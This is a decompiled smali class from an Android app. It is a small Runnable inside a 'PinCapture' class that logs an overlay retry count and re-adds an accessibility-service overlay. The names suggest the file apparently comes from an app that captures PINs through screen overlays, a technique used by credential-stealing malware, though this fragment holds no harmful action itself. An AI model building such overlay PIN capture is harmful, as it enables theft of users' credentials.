.class Lcom/lite/cloudfinder/pin/PinCapture$8;
.super Ljava/lang/Object;
.source "PinCapture.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/lite/cloudfinder/pin/PinCapture;->addOverlay(Landroid/accessibilityservice/AccessibilityService;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic val$s2:Landroid/accessibilityservice/AccessibilityService;


# direct methods
.method constructor <init>(Landroid/accessibilityservice/AccessibilityService;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 874
    iput-object p1, p0, Lcom/lite/cloudfinder/pin/PinCapture$8;->val$s2:Landroid/accessibilityservice/AccessibilityService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    .line 877
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "overlay retry "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Lcom/lite/cloudfinder/pin/PinCapture;->access$1300()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "PinCapture"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 878
    iget-object v0, p0, Lcom/lite/cloudfinder/pin/PinCapture$8;->val$s2:Landroid/accessibilityservice/AccessibilityService;

    invoke-static {v0}, Lcom/lite/cloudfinder/pin/PinCapture;->access$1400(Landroid/accessibilityservice/AccessibilityService;)V

    return-void
.end method
